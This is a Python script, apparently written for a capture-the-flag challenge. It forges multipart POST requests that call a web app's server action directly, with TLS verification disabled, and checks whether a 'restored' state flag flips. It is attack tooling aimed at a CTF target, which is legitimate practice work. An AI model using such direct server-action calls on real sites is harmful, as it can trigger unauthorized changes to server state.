#!/usr/bin/env python3
"""Search for escaped 'restored\":true'."""
import urllib.request, urllib.error, ssl, http.cookiejar

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ctx),
    urllib.request.HTTPCookieProcessor(jar),
)


def req(method, url, headers=None, body=None):
    r = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


# Two patterns: literal "restored" inside the page (raw HTML attr) and escaped
def restored_str(d):
    return d.count(b'restored\\":true'), d.count(b'restored\\":false'), d.count(b'"restored":true'), d.count(b'"restored":false')


s, h, d = req("GET", URL)
print("init:", restored_str(d), "len", len(d))

boundary, body = multipart([(f"$ACTION_ID_{ACTION_ID}", "")])
s, h, d = req("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print("MPA:", restored_str(d), "len", len(d))

s, h, d = req("GET", URL)
print("after GET:", restored_str(d), "len", len(d))

# Try with extra fields
boundary, body = multipart([(f"$ACTION_ID_{ACTION_ID}", ""), ("packet", "south-line.2026-03-27"), ("workOrder", "WO-17-04")])
s, h, d = req("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print("MPA+fields:", restored_str(d), "len", len(d))
